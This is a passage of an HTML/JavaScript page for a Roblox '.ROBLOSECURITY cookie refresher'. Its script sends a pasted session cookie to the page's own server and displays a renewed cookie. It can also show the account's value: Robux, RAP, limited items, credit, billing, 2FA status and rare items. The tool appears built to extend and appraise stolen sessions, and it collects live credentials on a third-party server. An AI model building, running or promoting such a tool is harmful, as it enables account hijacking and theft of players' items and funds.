            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m7.5 4.27 9 5.15"/><path d="M21 8a2 2 0 0 0-1-1.73l-7-4a2 2 0 0 0-2 0l-7 4A2 2 0 0 0 3 8v8a2 2 0 0 0 1 1.73l7 4a2 2 0 0 0 2 0l7-4A2 2 0 0 0 21 16Z"/><path d="m3.3 7 8.7 5 8.7-5"/><path d="M12 22V12"/></svg>
            Limiteds
          </span>
          <span class="acc-row-value" id="valLimiteds">—</span>
        </div>
        <div class="acc-row" id="rowCredit">
          <span class="acc-row-label">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="5" width="20" height="14" rx="2"/><line x1="2" y1="10" x2="22" y2="10"/></svg>
            Credit
          </span>
          <span class="acc-row-value" id="valCredit">—</span>
        </div>
        <div class="acc-row" id="rowPremium">
          <span class="acc-row-label">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="12 2 15.09 8.26 22 9.27 17 14.14 18.18 21.02 12 17.77 5.82 21.02 7 14.14 2 9.27 8.91 8.26 12 2"/></svg>
            Premium
          </span>
          <span class="acc-row-value" id="valPremium">—</span>
        </div>
      </div>

      <!-- Security -->
      <div class="acc-section" id="secSecurity">
        <div class="acc-section-hdr">Security</div>
        <div class="acc-row" id="rowEmail">
          <span class="acc-row-label">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/></svg>
            Email
          </span>
          <span class="acc-row-value dim" id="valEmail">—</span>
        </div>
        <div class="acc-row" id="row2fa">
          <span class="acc-row-label">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/><polyline points="9 12 11 14 15 10"/></svg>
            2FA
          </span>
          <span class="acc-row-value" id="val2fa">—</span>
        </div>
        <div class="acc-row" id="rowVoice">
          <span class="acc-row-label">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a3 3 0 0 0-3 3v7a3 3 0 0 0 6 0V5a3 3 0 0 0-3-3z"/><path d="M19 10v2a7 7 0 0 1-14 0v-2"/><line x1="12" y1="19" x2="12" y2="22"/></svg>
            Voice Chat
          </span>
          <span class="acc-row-value" id="valVoice">—</span>
        </div>
        <div class="acc-row" id="rowBilling">
          <span class="acc-row-label">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12V7H5a2 2 0 0 1 0-4h14v4"/><path d="M3 5v14a2 2 0 0 0 2 2h16v-5"/><path d="M18 12a2 2 0 0 0 0 4h4v-4Z"/></svg>
            Billing
          </span>
          <span class="acc-row-value" id="valBilling">—</span>
        </div>
      </div>

      <!-- Inventory -->
      <div class="acc-section" id="secInventory">
        <div class="acc-section-hdr">Inventory</div>
        <div class="acc-row" id="rowHeadless">
          <span class="acc-row-label">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a9 9 0 1 0 0 18 9 9 0 0 0 0-18z"/><path d="M9 17v1a1 1 0 0 0 1 1h4a1 1 0 0 0 1-1v-1"/><path d="M9 12h.01"/><path d="M15 12h.01"/></svg>
            Headless
          </span>
          <span class="acc-row-value" id="valHeadless">—</span>
        </div>
        <div class="acc-row" id="rowKorblox">
          <span class="acc-row-label">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="14.5 17.5 3 6 3 3 6 3 17.5 14.5"/><line x1="13" y1="19" x2="19" y2="13"/><line x1="16" y1="16" x2="20" y2="20"/><line x1="19" y1="21" x2="21" y2="19"/></svg>
            Korblox
          </span>
          <span class="acc-row-value" id="valKorblox">—</span>
        </div>
        <div class="acc-row" id="rowValkyrie">
          <span class="acc-row-label">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"/></svg>
            Valkyrie
          </span>
          <span class="acc-row-value" id="valValkyrie">—</span>
        </div>
      </div>

      <!-- Account -->
      <div class="acc-section" id="secAccount">
        <div class="acc-section-hdr">Account</div>
        <div class="acc-row" id="rowAge">
          <span class="acc-row-label">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="3" y="4" width="18" height="18" rx="2" ry="2"/><line x1="16" y1="2" x2="16" y2="6"/><line x1="8" y1="2" x2="8" y2="6"/><line x1="3" y1="10" x2="21" y2="10"/></svg>
            Account Age
          </span>
          <span class="acc-row-value dim" id="valAge">—</span>
        </div>
        <div class="acc-row" id="rowVisits">
          <span class="acc-row-label">
            <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="6" y1="12" x2="10" y2="12"/><line x1="8" y1="10" x2="8" y2="14"/><line x1="15" y1="13" x2="15.01" y2="13"/><line x1="18" y1="11" x2="18.01" y2="11"/><rect x="2" y="6" width="20" height="12" rx="2"/></svg>
            Game Visits
          </span>
          <span class="acc-row-value dim" id="valVisits">—</span>
        </div>
      </div>

    </div><!-- /acc-wrap -->

    <!-- new cookie -->
    <div class="cookie-section" id="cookieSection" style="display:none">
      <div class="cookie-section-lbl">New .ROBLOSECURITY</div>
      <div class="cookie-box" id="cookieBox"></div>
    </div>

    <!-- copy button -->
    <div class="copy-btn-wrap" id="copyWrap" style="display:none">
      <button class="copy-btn" id="copyBtn" onclick="copyCookie()">
        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
        <span id="copyTxt">Copy Cookie</span>
      </button>
    </div>

    <!-- raw response -->
    <div class="raw-wrap">
      <button class="raw-toggle" onclick="toggleRaw()">
        <span class="raw-toggle-lbl">Raw Response</span>
        <svg class="raw-arrow" id="rawArrow" width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round">
          <polyline points="6 9 12 15 18 9"/>
        </svg>
      </button>
      <div class="raw-body" id="rawBody">
        <div class="json-box" id="jsonBox"></div>
      </div>
    </div>

  </div><!-- /result-card -->

  <!-- HOW IT WORKS -->
  <div class="card">
    <div class="card-header">
      <span class="card-title">How It Works</span>
    </div>
    <div class="card-body" style="padding-top:4px;padding-bottom:4px;">
      <div class="steps">
        <div class="step">
          <div class="step-num">1</div>
          <div><div class="step-title">Validate Cookie</div><div class="step-desc">Authenticates your .ROBLOSECURITY token against Roblox servers.</div></div>
        </div>
        <div class="step">
          <div class="step-num">2</div>
          <div><div class="step-title">Fetch CSRF Token</div><div class="step-desc">Retrieves a fresh security token required to make account API requests.</div></div>
        </div>
        <div class="step">
          <div class="step-num">3</div>
          <div><div class="step-title">Generate Auth Ticket</div><div class="step-desc">Calls the authentication-ticket endpoint to create a one-time exchange token.</div></div>
        </div>
        <div class="step">
          <div class="step-num">4</div>
          <div><div class="step-title">Redeem New Session</div><div class="step-desc">Exchanges the ticket for a refreshed .ROBLOSECURITY cookie via Roblox auth.</div></div>
        </div>
      </div>
    </div>
  </div>

  <div class="footer">For personal use only &mdash; use responsibly.</div>

</div><!-- /shell -->

<script>
var _newCookie = '';
var _showInfo  = false;

/* ── toggle ── */
function tog() {
  _showInfo = !_showInfo;
  document.getElementById('toggleSw').className = 'toggle-switch' + (_showInfo ? ' on' : '');
}

/* ── submit ── */
function doRefresh() {
  var cookie = document.getElementById('cookieInput').value.trim();
  if (!cookie) { alert('Paste your .ROBLOSECURITY cookie.'); return; }

  /* reset previous result */
  hideResult();

  /* button loading state */
  document.getElementById('runBtn').disabled = true;
  document.getElementById('sp').style.display = 'block';
  document.getElementById('btnArrow').style.display = 'none';
  document.getElementById('btnTxt').textContent = 'Refreshing...';

  /* show skeleton */
  document.getElementById('skeletonCard').classList.add('show');

  var fd = new FormData();
  fd.append('action', 'refresh');
  fd.append('cookie', cookie);
  fd.append('show_info', _showInfo ? '1' : '0');

  fetch(window.location.href, { method: 'POST', body: fd })
    .then(function(r) { return r.json(); })
    .then(function(d) { onResult(d); })
    .catch(function(e) { onResult({ success: false, message: e.message || 'Network error.' }); });
}

function hideResult() {
  var rc = document.getElementById('resultCard');
  rc.classList.remove('show','ok-card','err-card');
  rc.style.display = '';
}

function resetBtn() {
  document.getElementById('runBtn').disabled = false;
  document.getElementById('sp').style.display = 'none';
  document.getElementById('btnArrow').style.display = '';
  document.getElementById('btnTxt').textContent = 'Refresh Cookie';
}

/* ── result ── */
function onResult(d) {
  /* hide skeleton */
  document.getElementById('skeletonCard').classList.remove('show');
  resetBtn();
  showResult(d);
}

function showResult(d) {
  var ok  = d.success === true;
  var rc  = document.getElementById('resultCard');
  var ban = document.getElementById('resBanner');

  /* banner */
  ban.className = 'res-banner ' + (ok ? 'ok' : 'err');
  document.getElementById('bannerIcon').className = 'banner-icon ' + (ok ? 'ok' : 'err');
  document.getElementById('bannerSvg').innerHTML = ok
    ? '<polyline points="20 6 9 17 4 12"/>'
    : '<line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/>';
  document.getElementById('bannerTitle').textContent = ok ? 'Refresh Successful' : 'Refresh Failed';
  document.getElementById('bannerSub').textContent   = d.message || (ok ? 'Your session has been renewed.' : 'Something went wrong.');

  /* error */
  var errSec = document.getElementById('errSection');
  if (!ok) {
    document.getElementById('errMsg').textContent = d.message || 'Unknown error.';
    errSec.style.display = 'block';
  } else {
    errSec.style.display = 'none';
  }

  /* account info (toggle ON, success) */
  var accWrap = document.getElementById('accWrap');
  if (ok && _showInfo && d.data && d.data.fullAccount) {
    var fa = d.data.fullAccount;
    var ai = d.data.accountInfo;

    if (ai && ai.avatarUrl) {
      document.getElementById('accAvatarImg').src = ai.avatarUrl;
      document.getElementById('accAvatarName').textContent = ai.displayName || ai.username;
      document.getElementById('accAvatarSub').textContent  = '@' + ai.username + ' · #' + ai.userId;
    }

    document.getElementById('valRobux').textContent    = fmt(fa.robux) + ' R$';
    document.getElementById('valRap').textContent      = fmt(fa.rap) + ' R$';
    document.getElementById('valLimiteds').textContent = fa.limiteds;
    document.getElementById('valCredit').textContent   = '$' + parseFloat(fa.credit).toFixed(2) + ' ' + fa.creditCurrency;
    document.getElementById('valPremium').innerHTML    = boolHtml(fa.hasPremium);
    document.getElementById('valEmail').textContent    = fa.emailDisplay || '—';
    document.getElementById('val2fa').innerHTML        = '<span class="' + (fa.has2FA === 'ENABLED' ? 'ok' : 'no') + '">' + fa.has2FA + '</span>';
    document.getElementById('valVoice').innerHTML      = boolHtml(fa.voiceChat);
    document.getElementById('valBilling').innerHTML    = boolHtml(fa.hasBilling);
    document.getElementById('valHeadless').innerHTML   = boolHtml(fa.headless);
    document.getElementById('valKorblox').innerHTML    = boolHtml(fa.korblox);
    document.getElementById('valValkyrie').innerHTML   = boolHtml(fa.valkyrie);
    document.getElementById('valAge').textContent      = fa.ageDays + ' days';
    document.getElementById('valVisits').textContent   = fmt(fa.gameVisits);

    accWrap.style.display = 'block';

    /* stagger animation */
    var avatar   = document.getElementById('accAvatar');
    var sections = ['secEconomy','secSecurity','secInventory','secAccount'];
    var rows     = ['rowRobux','rowRap','rowLimiteds','rowCredit','rowPremium',
                    'rowEmail','row2fa','rowVoice','rowBilling',
                    'rowHeadless','rowKorblox','rowValkyrie',
                    'rowAge','rowVisits'];

    /* reset */
    avatar.classList.remove('in');
    sections.forEach(function(id){ document.getElementById(id).classList.remove('in'); });
    rows.forEach(function(id){ document.getElementById(id).classList.remove('in'); });

    setTimeout(function(){ avatar.classList.add('in'); }, 80);
    sections.forEach(function(id, i){ setTimeout(function(){ document.getElementById(id).classList.add('in'); }, 180 + i * 90); });
    rows.forEach(function(id, i){ setTimeout(function(){ document.getElementById(id).classList.add('in'); }, 220 + i * 55); });

  } else {
    accWrap.style.display = 'none';
  }

  /* cookie box */
  var cookieSec = document.getElementById('cookieSection');
  var copyWrap  = document.getElementById('copyWrap');
  if (ok && d.data && d.data.newCookie) {
    _newCookie = d.data.newCookie;
    document.getElementById('cookieBox').textContent = _newCookie;
    cookieSec.style.display = 'block';
    copyWrap.style.display  = 'block';
  } else {
    _newCookie = '';
    cookieSec.style.display = 'none';
    copyWrap.style.display  = 'none';
  }

  /* raw */
  document.getElementById('jsonBox').textContent = JSON.stringify(d.data || d, null, 2);
  document.getElementById('rawBody').classList.remove('open');
  document.getElementById('rawArrow').classList.remove('open');

  rc.className = 'result-card show ' + (ok ? 'ok-card' : 'err-card');
}

function boolHtml(b) {
  return '<span class="' + (b ? 'ok' : 'no') + '">' + (b ? 'Yes' : 'No') + '</span>';
}
function fmt(n) { return Number(n).toLocaleString(); }

function toggleRaw() {
  document.getElementById('rawBody').classList.toggle('open');
  document.getElementById('rawArrow').classList.toggle('open');
}

function copyCookie() {
  if (!_newCookie) return;
  navigator.clipboard.writeText(_newCookie).then(function() {
    var btn = document.getElementById('copyBtn');
    var txt = document.getElementById('copyTxt');
    btn.classList.add('copied');
    txt.textContent = 'Copied!';
    setTimeout(function() {
      btn.classList.remove('copied');
      txt.textContent = 'Copy Cookie';
    }, 2200);
  });
}
</script>
</body>
</html>
